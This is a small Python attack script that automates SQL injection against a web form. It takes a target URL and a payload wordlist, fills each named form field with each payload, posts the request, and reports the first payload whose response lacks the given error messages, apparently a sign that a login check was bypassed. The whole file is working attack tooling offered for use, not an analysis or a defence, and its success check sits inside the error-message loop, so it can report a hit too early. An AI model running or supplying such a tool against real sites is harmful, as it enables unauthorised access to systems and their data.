#!/usr/bin/env python3

import requests
from sys import argv, exit

try:
	url = argv[1]
	sql_payload = argv[2]
	form_fields = argv[3]
	error_msg = argv[4]
except:
	print("Use: ./script.py url path/to/sqli/wordlist form_fields(comma-separated) error_msgs(comma-separated)")
	exit()

def start(url, payload_file, fields, error_msgs):
	if not url.startswith("http://") and not url.startswith("https://"):
		return print("[!] Invalid URL!")
	
	try:
		with open(payload_file) as fp:
			payloads = [x.rstrip() for x in fp.readlines()]
	except:
		return print("[!] Invalid wordlist path!")

	payload_request = {}
	print("[+] Working...")
	for field in fields.split(","):
		payload_request[field] = "" # Creating fields in the dictionary before inserting the payloads
	
	error_msgs = error_msgs.split(",")
	for payload in payloads:
		not_in = 0
		for key in payload_request.keys():
			payload_request[key] = payload # Defining each form field to the same payload
		r = requests.post(url, data=payload_request)
		for error_msg in error_msgs:
			if error_msg not in r.text:
				not_in += 1
			if not_in == len(error_msgs):
				return print(f"[+] Valid payload: {payload} // Fields: {payload_request}")
			else:
				pass
start(url, sql_payload, form_fields, error_msg)
